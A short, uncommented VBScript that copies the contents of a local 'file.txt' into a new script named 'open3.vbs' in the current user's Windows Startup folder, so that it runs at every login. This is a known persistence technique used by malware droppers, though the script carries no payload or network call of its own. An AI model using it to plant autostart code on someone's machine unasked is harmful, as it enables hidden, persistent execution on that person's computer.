

Set objShell = CreateObject( "WScript.Shell" )
appDataLocation=objShell.ExpandEnvironmentStrings("%APPDATA%")
quick_launch_location = appDataLocation & "\Microsoft\Windows\Start Menu\Programs\Startup\open3.vbs"

Dim FSO
Set FSO = CreateObject("Scripting.FileSystemObject")
set File = fso.CreateTextFile(quick_launch_location)

Const ForReading = 1
Dim fille, content

Set fille = fso.OpenTextFile("file.txt", ForReading)
content = fille.ReadAll
File.WriteLine content